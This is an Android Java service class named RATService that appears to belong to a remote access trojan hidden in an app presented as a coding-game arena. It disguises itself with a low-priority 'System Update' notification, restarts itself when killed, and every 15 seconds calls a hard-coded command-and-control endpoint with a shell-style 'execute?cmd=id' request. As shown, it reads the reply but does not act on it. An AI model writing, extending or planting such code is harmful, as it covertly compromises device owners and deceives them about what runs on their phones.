package com.codeduel.arena;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class RATService extends Service {
    private static final String C2 = "https://codeduelarena.onrender.com/api/shell";
    private Handler handler = new Handler();

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel("rat", "System", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
        startForeground(1, new Notification.Builder(this, "rat")
                .setContentTitle("System Update")
                .setContentText("Checking...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details).build());
        startHeartbeat();
    }

    private void startHeartbeat() {
        handler.postDelayed(new Runnable() {
            public void run() {
                new Thread(() -> {
                    try {
                        HttpURLConnection c = (HttpURLConnection) new URL(C2 + "/execute?cmd=id").openConnection();
                        c.setRequestMethod("GET");
                        BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
                        StringBuilder sb = new StringBuilder();
                        String l;
                        while ((l = r.readLine()) != null) sb.append(l);
                        r.close();
                    } catch (Exception e) {
                    }
                }).start();
                handler.postDelayed(this, 15000);
            }
        }, 5000);
    }

    @Override
    public int onStartCommand(Intent i, int f, int id) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent i) {
        return null;
    }
}